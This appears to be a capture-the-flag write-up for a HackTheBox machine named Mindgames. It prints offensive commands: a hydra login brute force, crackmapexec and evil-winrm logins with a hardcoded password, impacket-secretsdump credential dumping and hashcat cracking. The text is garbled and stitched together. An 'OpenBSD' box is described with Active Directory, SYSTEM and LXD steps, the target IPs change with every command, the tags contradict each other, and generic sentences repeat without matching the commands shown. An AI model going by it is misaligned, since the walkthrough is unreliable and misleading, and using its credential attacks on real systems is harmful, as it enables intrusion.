---
TitleSEO: "HackTheBox — Mindgames (Insane OpenBSD) | ZureFX"
TitlePost: "HackTheBox — Mindgames (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Mindgames. AS-REP Roasting and LXD Privilege Escalation to achieve insane compromise on OpenBSD."
Keywords: "pwntilldawn, medium, ctf, reversing, insane, easy"
URL: "https://zurefx.github.io/writeups/htb-mindgames-344.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mindgames-344/"
Date: "2025-03-13"
Tags: "PwnTillDawn, Medium, CTF, Reversing, Insane, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-mindgames-344"
Permalink: "/writeups/htb-mindgames-344.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Mindgames** is rated **Insane** on HackTheBox. It runs **OpenBSD** and the IP address during this analysis was `10.65.83.168`.

### Objectives

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.37.209.139 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
crackmapexec smb 10.43.216.185 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.74.80.86 -u administrator -p 'P@ssw0rd!'
```

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

### SMB Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.88.102.128/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Exploitation

### Vulnerability Identification

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible.

Key finding: **LXD Privilege Escalation**.

Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible.

### Initial Access

The database credentials were hardcoded in the application source code. Weak file permissions allowed modification of critical system files.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.30.53.243/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.18.33.79/FUZZ
nmap -sCV -p25,3389,993 10.85.107.204 -oN scan.txt
```

### Exploitation

The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.80.38.188/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.13.202.39
gobuster dir -u http://10.21.48.174/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions.

## Summary

### Tools Used

- `hashcat`
- `sqlmap`
- `sharphound`
- `wmiexec`
- `kerbrute`
- `netcat`
- `dcomexec`

### Key Takeaways

- AS-REP Roasting
- LXD Privilege Escalation
- DLL Hijacking
